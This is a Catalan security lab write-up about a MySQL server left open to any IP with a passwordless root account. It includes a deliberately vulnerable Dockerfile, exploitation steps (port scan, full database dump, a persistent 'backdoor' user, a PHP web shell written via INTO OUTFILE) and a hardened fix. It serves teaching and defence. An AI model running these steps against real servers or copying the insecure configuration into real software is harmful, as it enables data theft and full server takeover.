# Servei 3: MySQL - Credencials Febles i Acces Remot Sense Restriccions

## Descripció Breu

Una instancia MySQL mal configurada pot permetre acces remot sense restriccions amb credencials febles o inexistents. Quan MySQL esta configurat per acceptar connexions de qualsevol adreça IP (0.0.0.0) i el compte root no te contrasenya o en te una de trivial, qualsevol atacant que descobreixi el port 3306 pot obtenir control total de totes les bases de dades del servidor.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Acces complet a totes les bases de dades i les seves dades
- **Integritat** -> Modificacio o eliminacio de dades
- **Disponibilitat** -> Possibilitat d'eliminar bases de dades senceres

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Critic |
| **CVE relacionat** | CWE-521 (Weak Password Requirements), CWE-284 (Improper Access Control) |
| **Impacte real** | Control total de totes les bases de dades del servidor |
| **Escenari tipic** | Servidor MySQL accessible des d'Internet sense contrasenya de root |

---

## Implementació Vulnerable

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y mysql-server

# Acces remot sense restriccions
RUN sed -i 's/bind-address.*/bind-address = 0.0.0.0/' \
    /etc/mysql/mysql.conf.d/mysqld.cnf

# Root sense contrasenya des de qualsevol host
RUN service mysql start && \
    mysql -e "CREATE USER 'root'@'%' IDENTIFIED BY '';" && \
    mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%';" && \
    mysql -e "FLUSH PRIVILEGES;"
```

### Verificació de la vulnerabilitat

```bash
# Comprovar que MySQL escolta a totes les interficies
docker exec vuln-mysql netstat -tuln | grep 3306
# Output: tcp 0.0.0.0:3306

# Intentar connexio sense contrasenya
mysql -h localhost -P 3308 -u root
# Connexio acceptada sense contrasenya
```

---

## Com Explotar

### Pas 1: Descobrir el port MySQL obert
```bash
nmap -sV -p 3308 localhost
# Output: 3308/tcp open mysql MySQL 8.0.x
```

### Pas 2: Connexio sense contrasenya
```bash
mysql -h localhost -P 3308 -u root
# Acces complet sense contrasenya
```

### Pas 3: Exfiltrar totes les dades
```bash
# Veure totes les bases de dades
SHOW DATABASES;

# Llegir dades sensibles
USE dades_sensibles;
SELECT * FROM usuaris;
# Output: admin | admin123

# Volcatge complet
mysqldump -h localhost -P 3308 -u root --all-databases > dump.sql
```

### Pas 4: Crear backdoor persistent
```bash
# Crear usuari backdoor
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;
```

### Pas 5: Escalada a RCE via MySQL
```bash
# Si MySQL corre com a root, escriure fitxers al sistema
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
# Ara accessible via web: http://servidor/shell.php?cmd=id
```

---

## Solució

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y mysql-server

# Nomes connexions locals
RUN sed -i 's/bind-address.*/bind-address = 127.0.0.1/' \
    /etc/mysql/mysql.conf.d/mysqld.cnf

# Contrasenya forta i privilegis minims
RUN service mysql start && \
    mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'R00t_S3cur3!2024';" && \
    mysql -e "DELETE FROM mysql.user WHERE User='';" && \
    mysql -e "DELETE FROM mysql.user WHERE Host!='localhost';" && \
    mysql -e "DROP DATABASE IF EXISTS test;" && \
    mysql -e "FLUSH PRIVILEGES;"
```

### Verificació de la correcció
```bash
# MySQL nomes escolta localment
docker exec fixed-mysql netstat -tuln | grep 3306
# Output: tcp 127.0.0.1:3306

# Connexio sense contrasenya rebutjada
mysql -h localhost -P 3309 -u root
# Output: ERROR 1045 (28000): Access denied

# Connexio des de fora rebutjada
mysql -h <IP-externa> -P 3309 -u root -pR00t_S3cur3!2024
# Output: ERROR 2003: Can't connect
```

---

## Bones Practiques

- Mai deixar el compte root sense contrasenya
- Configurar bind-address a 127.0.0.1 si no cal acces remot
- Usar el principi de minim privilegi per als usuaris de base de dades
- Eliminar l'usuari anonymous i la base de dades test
- Usar contrasenyes d'almenys 12 caracters amb majuscules, minuscules, numeros i simbols
- Revisar periodacament els usuaris i privilegis amb SHOW GRANTS

---

## Referencies

- [MySQL Security Guidelines](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
- [MySQL Secure Deployment Guide](https://dev.mysql.com/doc/mysql-secure-deployment-guide/en/)
